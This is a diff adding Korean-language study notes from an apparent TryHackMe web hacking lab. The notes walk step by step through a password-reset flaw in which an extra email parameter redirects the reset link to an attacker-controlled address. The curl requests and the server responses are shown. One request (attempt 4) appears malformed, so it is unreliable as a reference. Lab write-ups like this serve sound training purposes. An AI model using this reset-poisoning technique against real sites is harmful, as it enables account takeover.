@@ -37,10 +37,45 @@ root@ip-10-10-41-144:~# curl http://10.10.140.126 -v
 This page is temporary while we work on the new homepage @ /new-home-beta
 -->
 ```
+---
 
+
+## 실습 
+
+실습 사이트 
+비번 변경 페이지 > 이메일 입력 > 이름 입력 > We'll send you a reset email to robert@acmeitsupport.thm
+
+시도 1 
+```
+user@tryhackme$ curl 'http://10.10.3.25/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+```
+```
+<p>We'll send you a reset email to <strong>robert@acmeitsupport.thm</strong></p>
+```
+시도 2 : 받는 메일을 바꿀 수 있는지 확인 
+```
+user@tryhackme$ curl 'http://10.10.3.25/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+```
+```
+<p>We'll send you a reset email to <strong>attacker@hacker.com</strong></p>
+```
+시도 3 
+실습 홈페이지에서 회원가입 > kimbbang@customer.acmeitsupport.thm 메일 만들기
+
+시도 4 : kimbbang@customer.acmeitsupport.thm로 비번 변경 메일 보내기 
+
+```
+user@tryhackme:~$ curl 'http://10.10.3.25/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&kimbbang@customer.acmeitsupport.thm'
+```
+시도 5 
+kimbbang으로 로그인해서 회원 메일함을 확인하면 robert의 비번을 바꿀 수 있는 메일이 있음 
 
 
 ---
+---
+
+### Course
+[TryHackMe - Introduction to Web Hacking](https://tryhackme.com/module/intro-to-web-hacking)    
+
 ### References
-[TryHackMe - Introduction to Web Hacking](https://tryhackme.com/module/intro-to-web-hacking)      
-[geeksforgeeks - curl command in Linux with Examples](https://www.geeksforgeeks.org/curl-command-in-linux-with-examples/)  
+[geeksforgeeks - curl command in Linux with Examples](https://www.geeksforgeeks.org/curl-command-in-linux-with-examples/)   
